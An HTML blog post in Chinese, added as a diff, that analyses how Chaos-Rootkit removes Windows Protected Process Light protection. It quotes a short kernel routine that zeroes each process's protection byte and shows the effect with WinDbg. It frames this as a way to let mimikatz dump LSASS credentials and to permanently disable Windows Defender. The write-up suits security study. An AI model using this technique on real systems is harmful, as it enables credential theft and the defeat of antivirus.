@@ -1,0 +1,75 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabin | rookit-3-ppl</title><meta name="description" content="&lt;h1 id=&quot;windows-rookit防护-ppl保护&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#windows-rookit防护-ppl保护&quot;&gt;&lt;/a&gt; windows rookit防护-PPL保护&lt;/h1&gt;
+&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/ZeroMemoryEx/Chaos-Rootkit&quot;&gt;https://github.com/ZeroMemoryEx/Chaos-Rootkit&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;之前文章:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/c_q8A4GguT6TBQZBSRcE-w&quot;&gt;windows rookit防护-进程隐藏&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/KVVluHMpz73mX_7Ect56ng&quot;&gt;windows rookit防护-权限提升&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabin"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabin" type="application/atom+xml">
+</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabin</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">rookit-3-ppl</h3><div class="article__date metadata"><div class="post-info">2025/07/29</div></div><div class="article__tags metadata">Tags:
+<a class="article__tags__link metadata" href="/tags/note/">note</a><a class="article__tags__link metadata" href="/tags/rootkit/">rootkit</a></div><div class="article__body"><h1 id="windows-rookit防护-ppl保护"><a class="markdownIt-Anchor" href="#windows-rookit防护-ppl保护"></a> windows rookit防护-PPL保护</h1>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/ZeroMemoryEx/Chaos-Rootkit">https://github.com/ZeroMemoryEx/Chaos-Rootkit</a></p>
+<p>之前文章:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/c_q8A4GguT6TBQZBSRcE-w">windows rookit防护-进程隐藏</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KVVluHMpz73mX_7Ect56ng">windows rookit防护-权限提升</a></li>
+</ul>
+<span id="more"></span>
+<p>或许我们的公众号会有更多你感兴趣的内容</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p>
+<h1 id="效果展示"><a class="markdownIt-Anchor" href="#效果展示"></a> 效果展示</h1>
+<p>**为什么我已经提权到了administrator但是mimikatz依旧无法dump lsass？**先不讲长篇大论，直接看看效果有个初次感受。依旧是windows 10 22H2版本，用KDM Mapper加载rootkit后使用。</p>
+<p>使用前：</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250705152856153.png" alt="image-20250705152856153" /></p>
+<p>使用后：</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250705152949577.png" alt="image-20250705152949577" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250705153118685.png" alt="image-20250705153118685" /></p>
+<p>Chaos-Rootkit的DbgPrint</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250705153144968.png" alt="image-20250705153144968" /></p>
+<h1 id="ppl保护介绍"><a class="markdownIt-Anchor" href="#ppl保护介绍"></a> PPL保护介绍</h1>
+<p>​	PPL全称是： <code>Protected Process Light</code>，前身是<code>Protected Process</code>。具体区别就是之前的进程只分为受保护和不受保护，没有提供更加细致的保护等级划分，只需要使用 <code>SeDebugPrivilege</code> 令牌权限即可获取任意进程的所有访问权限。在Windows 8.1过后在此基础之上新增了PPL。</p>
+<p>​	根据《深入解析Windows操作系统（第7版）（卷1）》中的描述（具体可见3.3.1 受保护进程轻型(PPL)）：</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250705155550117.png" alt="image-20250705155550117" /></p>
+<p>其中不同的签名方代表不同的信任等级</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250705155627253.png" alt="image-20250705155627253" /></p>
+<p><strong>这样实现低等级的进程即使已经提权也无法对更高等级的进程进行内存读写</strong>，红队中比较常用的就是使用mimikatz进行LSASS Dump，如果存在PPL保护，需要的就不止<code>SeDebugPrivilege</code>了。<strong>这里针对这个一问题进行举例</strong>。</p>
+<h2 id="mimikatz-lsass-dump"><a class="markdownIt-Anchor" href="#mimikatz-lsass-dump"></a> mimikatz LSASS Dump</h2>
+<p>在注册表<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa</code>中新增DWORD 值<code>RunAsPPL</code>，值为1</p>
+<p>如果在AD域中设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">打开组策略管理控制台 (GPMC)。</span><br><span class="line">创建在域级别链接或链接到包含您的计算机帐户的组织单位的新 GPO。或者，您可以选择已部署的 GPO。</span><br><span class="line">右键单击 GPO，然后单击编辑以打开组策略管理编辑器。</span><br><span class="line">展开计算机配置，展开首选项，然后展开Windows 设置。</span><br><span class="line">右键单击注册表，指向新建，然后单击注册表项。将出现“新建注册表属性”对话框。</span><br><span class="line">在Hive列表中，单击HKEY_LOCAL_MACHINE。</span><br><span class="line">在Key Path列表中，浏览至SYSTEM\CurrentControlSet\Control\Lsa。</span><br><span class="line">在值名称框中，键入RunAsPPL。</span><br><span class="line">在值类型框中，单击REG_DWORD。</span><br><span class="line">在数值数据框中，键入00000001。</span><br><span class="line">单击确定。</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707102800761.png" alt="image-20250707102800761" /></p>
+<p>即使是管理员权限也不能读取到LSASS中的NTML Hash。</p>
+<p>在加载Rootkit并且强制关闭所有进程（包括Lsass的保护后）</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707102719476.png" alt="image-20250707102719476" /></p>
+<h1 id="如何绕过"><a class="markdownIt-Anchor" href="#如何绕过"></a> 如何绕过</h1>
+<p>很明显一个直接思路就是修改注册表<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa</code>，删除或者修改<code>RunAsPPL</code>值。<strong>缺点也很明显，需要重启才能生效。</strong></p>
+<p>这里我们分析rootkit的相关代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">UnprotectAllProcesses</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    PVOID process = <span class="literal">NULL</span>;</span><br><span class="line">    PLIST_ENTRY plist;</span><br><span class="line">    NTSTATUS status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    NTSTATUS ret = <span class="built_in">PsLookupProcessByProcessId</span>((HANDLE)<span class="number">4</span>, (PEPROCESS*)&amp;process);</span><br><span class="line">	<span class="comment">// ret check ...</span></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        plist = (PLIST_ENTRY)((<span class="type">char</span>*)process + eoffsets.ActiveProcessLinks_offset);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (plist-&gt;Flink != (PLIST_ENTRY)((<span class="type">char</span>*)process + eoffsets.ActiveProcessLinks_offset))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;Blink: %p, Flink: %p\n&quot;</span>, plist-&gt;Blink, plist-&gt;Flink);</span><br><span class="line"></span><br><span class="line">            ULONG_PTR EProtectionLevel = (ULONG_PTR)plist-&gt;Flink - eoffsets.ActiveProcessLinks_offset + eoffsets.protection_offset;</span><br><span class="line"></span><br><span class="line">            *(BYTE*)EProtectionLevel = (BYTE)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            plist = plist-&gt;Flink;</span><br><span class="line">        &#125;</span><br><span class="line">        status = STATUS_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//__finally &#123;  ...  &#125;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先使用<code>PsLookupProcessByProcessId</code>从内核中找到system进程（system进程PID恒为4），然后顺着ActiveProcessLink遍历进程，通过<code>protection_offset</code>将<code>EProtectionLevel=0</code>。编程上的思路如此，那么实际内存中呢？重启后使用windbg调试来对比一下。</p>
+<p>复习一下EPROCESS的偏移，也可以参考<code>utils.c</code>中的 <code>InitializeOffsets</code>函数</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707104950168.png" alt="image-20250707104950168" /></p>
+<p>我的版本是19041</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707105043929.png" alt="image-20250707105043929" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707105028382.png" alt="image-20250707105028382" /></p>
+<p>这里查看的是<code>lsass</code>的进程</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707105126194.png" alt="image-20250707105126194" /></p>
+<ul>
+<li>Level：0x41，LSA签名的PPL</li>
+<li>Signer：0x4，对照最开始的表格这里是专指<code>lsass.exe</code></li>
+</ul>
+<p>rootkit中的代码直接将<code>protection level</code>置零，简单粗暴，这里手工实现一下</p>
+<p>修改前：</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707105806648.png" alt="image-20250707105806648" /></p>
+<p>修改后</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707110051493.png" alt="image-20250707110051493" /></p>
+<p>没有任何问题，在rootkit中有一段gui客户端不能调用的代码（可能是我还没发现）</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707110216421.png" alt="image-20250707110216421" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707110308618.png" alt="image-20250707110308618" /></p>
+<p>这里提供了更加细致的修改进程保护的选项，但是客户端貌似没有这段ioctl的代码</p>
+<h1 id="更多利用"><a class="markdownIt-Anchor" href="#更多利用"></a> 更多利用</h1>
+<p>比如<code>PROTECTION_LEVEL_ANTIMALWARE_LIGHT</code>就是一个和杀毒软件相关的保护等级，一般来说拥有<code>trustinstaller</code>权限和移除这个进程保护等级才能永久关闭windows defender（关闭进程和删除相关文件）。当然关闭windows defender有更多更优雅的方式，这里只是大致说说如何利用PPL相关权限。</p>
+<p>关于其他保护等级的利用可以搜索更多资料，这里就不再赘述。</p>
+<h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1>
+<p><a target="_blank" rel="noopener" href="https://support.kaspersky.com/us/common/windows/13905">https://support.kaspersky.com/us/common/windows/13905</a></p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals">https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com.cn/developer/article/2013602">https://cloud.tencent.com.cn/developer/article/2013602</a></p>
+</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2098/12/31/develop_handbook/">prev_post</a><a class="pagination__link pagination__next" href="/2025/06/23/cs-external-2/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>
